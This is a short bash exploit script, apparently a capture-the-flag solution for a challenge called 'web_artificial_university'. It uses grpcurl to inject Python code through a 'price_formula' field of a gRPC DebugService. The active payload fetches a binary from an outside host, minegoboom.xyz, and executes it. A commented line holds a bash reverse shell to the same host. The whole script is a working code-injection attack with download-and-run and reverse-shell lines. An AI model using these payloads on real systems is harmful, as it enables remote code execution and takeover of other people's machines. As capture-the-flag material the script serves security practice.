#!/bin/bash

# Instructions: run docker container with this command only:
# docker run --rm -it --network host --name=web_artificial_university web_artificial_university so all ports are open for this host

# ENCODED_PAYLOAD="__import__('os').system('bash -c \\\"bash -i >& /dev/tcp/minegoboom.xyz/9001 0>&1\\\"')"
ENCODED_PAYLOAD="__import__('os').system('curl -o /tmp/revbin http://minegoboom.xyz:9002/revbin;chmod +x /tmp/revbin;/tmp/revbin')"

grpcurl -plaintext \
  -import-path ../src/product_api \
  -proto product.proto \
  -d "{\"input\": {\"price_formula\": {\"string_value\": \"$ENCODED_PAYLOAD\"}}}" \
  127.0.0.1:50051 product.ProductService/DebugService
